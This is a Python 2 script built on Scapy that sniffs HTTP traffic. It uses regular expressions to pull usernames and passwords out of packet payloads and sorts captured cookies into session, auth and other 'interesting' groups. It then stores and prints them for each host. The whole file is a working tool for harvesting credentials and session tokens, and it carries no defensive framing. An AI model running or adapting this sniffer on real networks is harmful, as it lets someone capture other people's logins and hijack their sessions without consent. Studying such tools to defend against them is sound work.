import re
import socket
import traceback
from scapy.all import *
from HTTP import *
from collections import defaultdict

def getCredentials(pkt):
    if Raw not in pkt:
        return (None, None)

    raw = pkt[Raw].load
    
    username = list(set(re.findall("user(?:name)?=(.+?)[\&\;\r\n]", raw, re.IGNORECASE) + re.findall("uname=(.+)[\&\;\r\n]", raw, re.IGNORECASE)))
    if len(username) <= 0:
        username = None
    password = list(set(re.findall("p(?:ass)?w(?:or)?d=(.+?)[\&\;\r\n]", raw, re.IGNORECASE)))
    if len(password) <= 0:
        password = None
    return (username, password)


INTERESTING_WORDS = ["user","name","pass","sess","logged","login","id","path"]
def getCookies(pkt, interesting_words=INTERESTING_WORDS):
    if Raw not in pkt:
        return {"session":None, "auth":None, "interesting":None}
    
    raw = pkt[Raw].load
    
    cookies = {}
    if HTTPrequest in pkt and "Cookie: " in raw:
        cookie_string = raw[raw.index("Cookie: ")+8:]
        try:
            cookie_string = cookie_string[:cookie_string.index('\r\n')]
        except:
            # If no /r/n is found, the entire string must be the cookie, so just leave it
            pass
        cookie_pairs  = [p.split('=') for p in cookie_string.split(';')]
    elif HTTPresponse in pkt and "Set-Cookie: " in raw:
        cookie_pairs = [p.split('=') for p in re.findall("Set-Cookie: (.*?=.*?);", raw)]
    else:
        return {"session":None, "auth":None, "interesting":None}
    for p in cookie_pairs:
        cookies[p[0]] = p[1]
    
    session_cookies = []
    auth_cookies = []
    interesting_cookies = []
    for cookie in cookie_pairs:
        if "session" in cookie[0].lower() or "sid" in cookie[0].lower():
            session_cookies.append(cookie)
        elif "auth" in cookie[0].lower() or "token" in cookie[0].lower():
            auth_cookies.append(cookie)
        else:
            for iw in interesting_words:
                if iw in cookie[0].lower():
                    interesting_cookies.append(cookie)
    
    return {"session":session_cookies, "auth":auth_cookies, "interesting":interesting_cookies}


def callback(pkt, hostdict=None):
    try:
        hostname = re.findall("Host: (.*)\\r\\n", pkt[HTTP].Host)[0]
    except IndexError:
        hostname = pkt[HTTP].Host
    except AttributeError:
        try:
            hostname = socket.gethostbyaddr(pkt[IP].dst if not pkt[IP].dst.startswith('192.168.') else pkt[IP].src)[0]
        except socket.herror:
            hostname = pkt[IP].dst if not pkt[IP].dst.startswith('192.168.') else pkt[IP].src
    try:
        username, password = getCredentials(pkt)
        cookies = getCookies(pkt)
        if hostdict is not None:
            if hostname not in hostdict:
                hostdict[hostname] = {
                    "credentials" : {},
                    "cookies"     : {}
                }
            for u in (username if username else [None]):
                if u not in hostdict[hostname]["credentials"]:
                    hostdict[hostname]["credentials"][u] = []
                hostdict[hostname]["credentials"][u] += list(password or [])
                if cookies is None:
                    continue
                for category in cookies:
                    if cookies[category] is None:
                        continue
                    hostdict[hostname]["cookies"][category] = dict(cookies[category])

        else:
            print "no hostdict provided; nothing will be stored."
        if username or password or cookies["session"] or cookies["auth"] or cookies["interesting"]:
            print
            print hostname + ":"
            
            if username or password:
                print "  Credentials sniffed:\n    " + ("Possible Usernames:  " + str(username)) if username else "" + ("    Possible Passwords:  "+str(password)) if password else ""

            if cookies["session"]:
                print "  Session:\n    ", "\n    ".join([':'.join(c) for c in cookies["session"]])
            if cookies["auth"]:
                print "  Auth:\n    ", "\n    ".join([':'.join(c) for c in cookies["auth"]])
            if cookies["interesting"]:
                print "  Interesting:\n    ", "\n    ".join([':'.join(c) for c in cookies["interesting"]])
    except:
        print traceback.format_exc()
        
        